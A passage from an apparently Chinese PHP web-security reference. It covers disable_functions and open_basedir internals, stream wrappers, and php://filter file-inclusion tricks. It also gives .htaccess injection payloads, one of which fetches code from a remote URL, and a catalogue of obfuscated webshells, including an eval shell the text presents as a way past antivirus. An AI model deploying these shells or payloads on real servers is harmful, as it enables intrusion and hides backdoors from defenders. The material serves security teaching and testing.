<h6>ZipArchive 原生利用<a class="headerlink" href="#ziparchive" title="永久链接至标题">¶</a></h6>
<p>php原生类 <code class="docutils literal notranslate"><span class="pre">ZipArchive::open()</span></code> 中的flag参数如果设置为  <code class="docutils literal notranslate"><span class="pre">ZipArchive::OVERWRITE</span></code> 时，会删除指定文件，该特性在一定条件下可以用于删除文件。</p>
</div>
<div class="section" id="session">
<h6>Session<a class="headerlink" href="#session" title="永久链接至标题">¶</a></h6>
<p>PHP中session默认是以文件形式存储的，文件以sess_sessionid命名，在session一定程度可控的情况下，可通过session触发反序列化。</p>
</div>
</div>
<div class="section" id="cve">
<h5>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h5>
<div class="section" id="cve-2016-7124">
<h6>CVE-2016-7124<a class="headerlink" href="#cve-2016-7124" title="永久链接至标题">¶</a></h6>
<p>在PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性(变量)数大于实际的个数时， <code class="docutils literal notranslate"><span class="pre">__wakeup()</span></code> 不会被执行。</p>
</div>
</div>
</div>
<span id="document-language/php/disablefunc"></span><div class="section" id="disable-functions">
<h4>Disable Functions<a class="headerlink" href="#disable-functions" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>机制实现<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>PHP中Disable Function的实现是在php-src/Zend/Zend-API.c中。PHP在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用 <code class="docutils literal notranslate"><span class="pre">zend_disable_function</span></code> 来实现禁止的效果。</p>
<p>这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：</p>
<div class="highlight-cpp notranslate"><div class="highlight"><pre><span></span>ZEND_API int zend_disable_function(char *function_name, size_t function_name_length) /* {{{ */
{
    zend_internal_function *func;
    if ((func = zend_hash_str_find_ptr(CG(function_table), function_name, function_name_length))) {
        zend_free_internal_arg_info(func);
        func-&gt;fn_flags &amp;= ~(ZEND_ACC_VARIADIC | ZEND_ACC_HAS_TYPE_HINTS | ZEND_ACC_HAS_RETURN_TYPE);
        func-&gt;num_args = 0;
        func-&gt;arg_info = NULL;
        func-&gt;handler = ZEND_FN(display_disabled_function);
        return SUCCESS;
    }
    return FAILURE;
}
</pre></div>
</div>
<p>和函数的实现方式类似，disable classes也是这样实现的</p>
<div class="highlight-cpp notranslate"><div class="highlight"><pre><span></span>ZEND_API int zend_disable_class(char *class_name, size_t class_name_length) /* {{{ */
{
    zend_class_entry *disabled_class;
    zend_string *key;

    key = zend_string_alloc(class_name_length, 0);
    zend_str_tolower_copy(ZSTR_VAL(key), class_name, class_name_length);
    disabled_class = zend_hash_find_ptr(CG(class_table), key);
    zend_string_release_ex(key, 0);
    if (!disabled_class) {
        return FAILURE;
    }
    INIT_CLASS_ENTRY_INIT_METHODS((*disabled_class), disabled_class_new);
    disabled_class-&gt;create_object = display_disabled_class;
    zend_hash_clean(&amp;disabled_class-&gt;function_table);
    return SUCCESS;
}
</pre></div>
</div>
<p>因为这个实现机制的原因，在PHP启动后通过 <code class="docutils literal notranslate"><span class="pre">ini_set</span></code> 来修改 <code class="docutils literal notranslate"><span class="pre">disable_functions</span></code> 或 <code class="docutils literal notranslate"><span class="pre">disable_classes</span></code> 是无效的。</p>
</div>
<div class="section" id="bypass">
<h5>Bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>LD_PRELOAD绕过</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li>
<li><code class="docutils literal notranslate"><span class="pre">mail()</span></code> + <code class="docutils literal notranslate"><span class="pre">putenv</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>PHP OPcache</li>
<li>Mail函数</li>
<li><dl class="first docutils">
<dt>imap_open</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://www.cvedetails.com/cve/cve-2018-19518">https://www.cvedetails.com/cve/cve-2018-19518</a></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-language/php/basedir"></span><div class="section" id="open-basedir">
<h4>Open Basedir<a class="headerlink" href="#open-basedir" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>机制实现<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>PHP中Disable Function的实现是在php-src/main/fopen-wrappers.c中，实现方式是在调用文件等相关操作时调用函数根据路径来检查是否在basedir内，其中一部分实现代码如下：</p>
<div class="code c highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PHPAPI</span> <span class="nb">int</span> <span class="n">php_check_open_basedir_ex</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="nb">int</span> <span class="n">warn</span><span class="p">)</span>
<span class="p">{</span>
    <span class="o">/*</span> <span class="n">Only</span> <span class="n">check</span> <span class="n">when</span> <span class="n">open_basedir</span> <span class="ow">is</span> <span class="n">available</span> <span class="o">*/</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">open_basedir</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">PG</span><span class="p">(</span><span class="n">open_basedir</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">char</span> <span class="o">*</span><span class="n">pathbuf</span><span class="p">;</span>
        <span class="n">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
        <span class="n">char</span> <span class="o">*</span><span class="n">end</span><span class="p">;</span>

        <span class="o">/*</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">path</span> <span class="ow">is</span> <span class="n">too</span> <span class="n">long</span> <span class="n">so</span> <span class="n">we</span> <span class="n">can</span> <span class="n">give</span> <span class="n">a</span> <span class="n">more</span> <span class="n">useful</span> <span class="n">error</span>
        <span class="o">*</span> <span class="n">message</span><span class="o">.</span> <span class="o">*/</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">MAXPATHLEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">php_error_docref</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="n">E_WARNING</span><span class="p">,</span> <span class="s2">&quot;File name is longer than the maximum allowed path length on this platform (</span><span class="si">%d</span><span class="s2">): </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">MAXPATHLEN</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
            <span class="n">errno</span> <span class="o">=</span> <span class="n">EINVAL</span><span class="p">;</span>
            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">pathbuf</span> <span class="o">=</span> <span class="n">estrdup</span><span class="p">(</span><span class="n">PG</span><span class="p">(</span><span class="n">open_basedir</span><span class="p">));</span>

        <span class="n">ptr</span> <span class="o">=</span> <span class="n">pathbuf</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">end</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">DEFAULT_DIR_SEPARATOR</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">end</span> <span class="o">!=</span> <span class="n">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">;</span>
                <span class="n">end</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">php_check_specific_open_basedir</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">efree</span><span class="p">(</span><span class="n">pathbuf</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">ptr</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">warn</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">php_error_docref</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="n">E_WARNING</span><span class="p">,</span> <span class="s2">&quot;open_basedir restriction in effect. File(</span><span class="si">%s</span><span class="s2">) is not within the allowed path(s): (</span><span class="si">%s</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">PG</span><span class="p">(</span><span class="n">open_basedir</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="n">efree</span><span class="p">(</span><span class="n">pathbuf</span><span class="p">);</span>
        <span class="n">errno</span> <span class="o">=</span> <span class="n">EPERM</span><span class="p">;</span> <span class="o">/*</span> <span class="n">we</span> <span class="n">deny</span> <span class="n">permission</span> <span class="n">to</span> <span class="nb">open</span> <span class="n">it</span> <span class="o">*/</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">/*</span> <span class="n">Nothing</span> <span class="n">to</span> <span class="n">check</span><span class="o">...</span> <span class="o">*/</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<span id="document-language/php/config"></span><div class="section" id="id1">
<h4>安全相关配置<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>函数与类限制<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>可通过 <code class="docutils literal notranslate"><span class="pre">disable_functions</span></code> / <code class="docutils literal notranslate"><span class="pre">disable_classes</span></code> 限制PHP可调用的函数和类。</p>
</div>
<div class="section" id="id3">
<h5>目录访问限制<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>可通过 <code class="docutils literal notranslate"><span class="pre">open_basedir</span></code> 限制PHP可访问的目录。</p>
</div>
<div class="section" id="id4">
<h5>远程引用限制<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>可通过 <code class="docutils literal notranslate"><span class="pre">all_url_include</span></code> 限制远程文件包含，默认关闭。
可通过 <code class="docutils literal notranslate"><span class="pre">allow_url_fopen</span></code> 限制打开远程文件，默认开启。</p>
</div>
<div class="section" id="session">
<h5>Session<a class="headerlink" href="#session" title="永久链接至标题">¶</a></h5>
<div class="section" id="session-save">
<h6>Session.Save<a class="headerlink" href="#session-save" title="永久链接至标题">¶</a></h6>
<p>PHP的Session默认handler为文件，存储在 php.ini 的 <code class="docutils literal notranslate"><span class="pre">session.save_path</span></code> 中，若有任意读写文件的权限，则可修改或读取session。从phpinfo中可获得session位置。</p>
</div>
<div class="section" id="session-upload">
<h6>Session.Upload<a class="headerlink" href="#session-upload" title="永久链接至标题">¶</a></h6>
<p>PHP默认开启了 <code class="docutils literal notranslate"><span class="pre">session.upload_progress.enabled</span></code> ， 该选项会导致生成上传进度文件，其存储路径可以在phpinfo中获取。</p>
<p>那么可以构造特别的报文向服务器发送，在有LFI的情况下即可利用。</p>
</div>
</div>
</div>
<span id="document-language/php/stream"></span><div class="section" id="php">
<h4>PHP流<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>流（Streams）的概念是在php 4.3引入的，是对流式数据的抽象，用于统一数据操作，比如文件数据、网络数据、压缩数据等。</p>
<p>流可以通过file、open、fwrite、fclose、file_get_contents、
file_put_contents等函数操作。</p>
</div>
<div class="section" id="id2">
<h5>封装协议<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。支持的协议可用 <code class="docutils literal notranslate"><span class="pre">stream_get_wrappers()</span></code> 查看。</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">file://</span></code> 访问本地文件系统</li>
<li><code class="docutils literal notranslate"><span class="pre">http://</span></code> 访问 HTTP(s) 网址</li>
<li><code class="docutils literal notranslate"><span class="pre">ftp://</span></code> 访问 FTP(s) URLs</li>
<li><code class="docutils literal notranslate"><span class="pre">php://</span></code> 访问各个输入/输出流（I/O streams）</li>
<li><code class="docutils literal notranslate"><span class="pre">zlib://</span></code> 压缩流</li>
<li><code class="docutils literal notranslate"><span class="pre">data://</span></code> 数据（RFC 2397）</li>
<li><code class="docutils literal notranslate"><span class="pre">glob://</span></code> 查找匹配的文件路径模式</li>
<li><code class="docutils literal notranslate"><span class="pre">phar://</span></code> PHP 归档</li>
<li><code class="docutils literal notranslate"><span class="pre">ssh2://</span></code> Secure Shell 2</li>
<li><code class="docutils literal notranslate"><span class="pre">rar://</span></code> RAR</li>
<li><code class="docutils literal notranslate"><span class="pre">ogg://</span></code> 音频流</li>
<li><code class="docutils literal notranslate"><span class="pre">expect://</span></code> 处理交互式的流</li>
</ul>
</div>
<div class="section" id="id3">
<h5>PHP支持流<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>PHP 提供了一些输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<p>需要注意的是，流不受 <code class="docutils literal notranslate"><span class="pre">allow_url_fopen</span></code> 限制，但是 <code class="docutils literal notranslate"><span class="pre">php://input</span></code>、 <code class="docutils literal notranslate"><span class="pre">php://stdin</span></code>、 <code class="docutils literal notranslate"><span class="pre">php://memory</span></code> 和 <code class="docutils literal notranslate"><span class="pre">php://temp</span></code> 受限于 <code class="docutils literal notranslate"><span class="pre">allow_url_include</span></code> 。</p>
<div class="section" id="id4">
<h6>输入输出流<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<p><code class="docutils literal notranslate"><span class="pre">php://stdin</span></code> 、 <code class="docutils literal notranslate"><span class="pre">php://stdout</span></code> 和 <code class="docutils literal notranslate"><span class="pre">php://stderr</span></code> 允许直接访问 PHP 进程相应的输入或者输出流。数据流引用了复制的文件描述符，所以如果在打开 <code class="docutils literal notranslate"><span class="pre">php://stdin</span></code> 并在之后关了它，仅是关闭了复制品，真正被引用的 STDIN 并不受影响。</p>
<p>其中 <code class="docutils literal notranslate"><span class="pre">php://stdin</span></code> 是只读的， <code class="docutils literal notranslate"><span class="pre">php://stdout</span></code> 和 <code class="docutils literal notranslate"><span class="pre">php://stderr</span></code> 是只写的。</p>
</div>
<div class="section" id="fd">
<h6>fd<a class="headerlink" href="#fd" title="永久链接至标题">¶</a></h6>
<p>php://fd 允许直接访问指定的文件描述符。例如 <code class="docutils literal notranslate"><span class="pre">php://fd/3</span></code> 引用了文件描述符 3。</p>
</div>
<div class="section" id="memorytemp">
<h6>memory与temp<a class="headerlink" href="#memorytemp" title="永久链接至标题">¶</a></h6>
<p><code class="docutils literal notranslate"><span class="pre">php://memory</span></code> 和 <code class="docutils literal notranslate"><span class="pre">php://temp</span></code> 是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code class="docutils literal notranslate"><span class="pre">php://memory</span></code> 总是把数据储存在内存中，而 <code class="docutils literal notranslate"><span class="pre">php://temp</span></code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 <code class="docutils literal notranslate"><span class="pre">sys_get_temp_dir()</span></code> 的方式一致。</p>
<p><code class="docutils literal notranslate"><span class="pre">php://temp</span></code> 的内存限制可通过添加 <code class="docutils literal notranslate"><span class="pre">/maxmemory:NN</span></code> 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>
</div>
<div class="section" id="input">
<h6>input<a class="headerlink" href="#input" title="永久链接至标题">¶</a></h6>
<p><code class="docutils literal notranslate"><span class="pre">php://input</span></code> 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 <code class="docutils literal notranslate"><span class="pre">php://input</span></code> 来代替 <code class="docutils literal notranslate"><span class="pre">$HTTP_RAW_POST_DATA</span></code>，因为它不依赖于特定的 php.ini 指令。而且，这样的情况下 <code class="docutils literal notranslate"><span class="pre">$HTTP_RAW_POST_DATA</span></code> 默认没有填充，比激活 <code class="docutils literal notranslate"><span class="pre">always_populate_raw_post_data</span></code> 潜在需要更少的内存。 <code class="docutils literal notranslate"><span class="pre">enctype=&quot;multipart/form-data&quot;</span></code> 的时候 <code class="docutils literal notranslate"><span class="pre">php://input</span></code> 是无效的。</p>
</div>
</div>
<div class="section" id="filter">
<h5>filter<a class="headerlink" href="#filter" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">php://filter</span></code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用。PHP默认提供了一些流过滤器，除此之外，还可以使用各种自定义过滤器。</p>
<p>filter有resource, read, write三个参数，resource参数是必须的。它指定了你要筛选过滤的数据流。 read和write是可选参数，可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
<div class="section" id="id5">
<h6>过滤器列表<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>可以通过 <code class="docutils literal notranslate"><span class="pre">stream_get_filters()</span></code> 获取已经注册的过滤器列表。其中PHP内置的过滤器如下：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>字符串过滤器</dt>
<dd><ul class="first last">
<li>string.rot13</li>
<li>string.toupper</li>
<li>string.tolower</li>
<li>string.strip_tags</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>转换过滤器</dt>
<dd><ul class="first last">
<li>convert.base64-encode</li>
<li>convert.base64-decode</li>
<li>convert.quoted-printable-encode</li>
<li>convert.quoted-printable-decode</li>
<li>convert.iconv.*</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>压缩过滤器</dt>
<dd><ul class="first last">
<li>zlib.deflate</li>
<li>zlib.inflate</li>
<li>bzip2.compress</li>
<li>bzip2.decompress</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>加密过滤器</dt>
<dd><ul class="first last">
<li>mcrypt.``ciphername``</li>
<li>mdecrypt.``ciphername``</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="tricks">
<h6>过滤器利用tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>LFI</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">php://filter/convert.base64-encode/resource=index.php</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>XXE读取文件时会因而解析报错，可用base64编码</li>
<li>base64编码会弃掉未在码表内的字符，可用于绕过一些文件格式</li>
<li>部分 convert 会有大量的资源消耗，可用作DoS</li>
<li>rot13 / convert 转换 过WAF</li>
</ul>
</div>
</div>
</div>
<span id="document-language/php/htaccess"></span><div class="section" id="htaccess-injection-payload">
<h4>htaccess injection payload<a class="headerlink" href="#htaccess-injection-payload" title="永久链接至标题">¶</a></h4>
<div class="section" id="file-inclusion">
<h5>file inclusion<a class="headerlink" href="#file-inclusion" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
</pre></div>
</div>
</div>
<div class="section" id="code-execution">
<h5>code execution<a class="headerlink" href="#code-execution" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="o">.</span><span class="n">htaccess</span>
<span class="c1">#&lt;?php phpinfo();</span>
</pre></div>
</div>
</div>
<div class="section" id="id1">
<h5>file inclusion<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_flag</span> <span class="n">allow_url_include</span> <span class="mi">1</span>
<span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span><span class="n">base64</span><span class="p">,</span><span class="n">PD9waHAgcGhwaW5mbygpOw</span><span class="o">==</span>
<span class="c1">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span>
<span class="c1">#php_value auto_append_file https://sektioneins.de/evil-code.txt</span>
</pre></div>
</div>
</div>
<div class="section" id="code-execution-with-utf-7">
<h5>code execution with UTF-7<a class="headerlink" href="#code-execution-with-utf-7" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_flag</span> <span class="n">zend</span><span class="o">.</span><span class="n">multibyte</span> <span class="mi">1</span>
<span class="n">php_value</span> <span class="n">zend</span><span class="o">.</span><span class="n">script_encoding</span> <span class="s2">&quot;UTF-7&quot;</span>
<span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="o">.</span><span class="n">htaccess</span>
<span class="c1">#+ADw?php phpinfo()+ADs</span>
</pre></div>
</div>
</div>
<div class="section" id="source-code-disclosure">
<h5>Source code disclosure<a class="headerlink" href="#source-code-disclosure" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_flag</span> <span class="n">engine</span> <span class="mi">0</span>
</pre></div>
</div>
</div>
</div>
<span id="document-language/php/webshell"></span><div class="section" id="webshell">
<h4>WebShell<a class="headerlink" href="#webshell" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>常见变形<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>GLOBALS</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">eval($GLOBALS['_POST']['op']);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">$_FILE</span></code></dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">eval($_FILE['name']);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>拆分</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">eval(${&quot;_PO&quot;.&quot;ST&quot;}</span> <span class="pre">['sz']);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>动态函数执行</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$k=&quot;ass&quot;.&quot;ert&quot;;</span> <span class="pre">$k(${&quot;_PO&quot;.&quot;ST&quot;}</span> <span class="pre">['sz']);</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">$a=$_GET['a'];$a($_GET['b']);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>create_function</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$function</span> <span class="pre">=</span> <span class="pre">create_function('$code',strrev('lave').'('.strrev('TEG_$').'[&quot;code&quot;]);');$function();</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>preg_replace</li>
<li><dl class="first docutils">
<dt>变形</dt>
<dd><ul class="first last">
<li>str_replace(&quot; &quot;, &quot;e v a l&quot;)</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>进制转化</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>进制运算</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>自增运算</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$a=&quot;a&quot;;$a++;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>强制类型转换</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$a='';$a.=[];</span> <span class="pre">//</span> <span class="pre">Array</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>利用文件名</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">__FILE__</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>注释</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$a=&quot;e&quot;.&quot;v&quot;./*-/*-*/&quot;a&quot;./*-*/&quot;l&quot;;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>反射</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">ReflectionFunction</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="bypass">
<h5>Bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>基于少见函数</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">mb_eregi_replace('.*',$_GET[1],'','e');</span></code></li>
<li>set_error_handler + trigger_error</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>基于污染传播</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">putenv($_GET[&quot;c&quot;]);eval(getenv('path'));</span></code></li>
<li>parse_str</li>
<li>parse_url</li>
<li>extract</li>
<li>token_get_all</li>
<li>define</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>基于少见源</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$a</span> <span class="pre">=</span> <span class="pre">filter_input(INPUT_GET,'c');</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">eval(end(getallheaders()));</span></code></li>
<li>get_defined_vars</li>
<li>getallheaders</li>
<li>get_meta_tags</li>
<li>phpinfo</li>
<li>外部变量 / 文件信息</li>
<li>重载 toString</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id2">
<h5>字符串变形函数<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>base64_decode</li>
<li>base64_encode</li>
<li>str_replace</li>
<li>str_rot13</li>
<li>strtok</li>
<li>strtolower</li>
<li>strtoupper</li>
<li>strtr</li>
<li>substr</li>
<li>substr_replace</li>
<li>trim</li>
<li>ucfirst</li>
<li>ucwords</li>
</ul>
</div>
<div class="section" id="id3">
<h5>回调函数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>array_filter</li>
<li>array_map</li>
<li>array_reduce</li>
<li>array_walk</li>
<li>array_walk</li>
<li>array_walk_recursive</li>
<li>call_user_func</li>
<li>call_user_func_array</li>
<li>filter_var</li>
<li>filter_var_array</li>
<li>preg_replace_callback</li>
<li>register_tick_function</li>
<li>registregister_shutdown_function</li>
<li>uasort</li>
<li>uksort</li>
</ul>
</div>
<div class="section" id="id4">
<h5>加解密函数<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>mcrypt_encrypt</li>
<li>openssl_encrypt</li>
</ul>
</div>
<div class="section" id="id5">
<h5>其他执行方式<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>FFI</li>
<li>SimpleXML</li>
<li>SimpleXMLElement</li>
</ul>
</div>
<div class="section" id="id6">
<h5>自定义函数<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。</p>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>$string = &#39;&#39;;
$password = &#39;password&#39;;
if(isset($_POST[$password])){
    $hex = $_POST[$password];
    for($i = 0; $i &lt; strlen($hex) - 1; $i += 2) {
        $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
}
eval($string);
</pre></div>
</div>
</div>
<div class="section" id="shell">
<h5>特殊字符Shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h5>
<p>PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。</p>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?=`{${~&quot;\xa0\xb8\xba\xab&quot;}[~&quot;\xa0&quot;]}`;
</pre></div>
</div>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>@$_++;
$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
@${$__}[!$_](${$__}[$_]);
</pre></div>
</div>
<div class="code php highlight-default notranslate"><div class="highlight"><pre><span></span>$_=[];
$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;
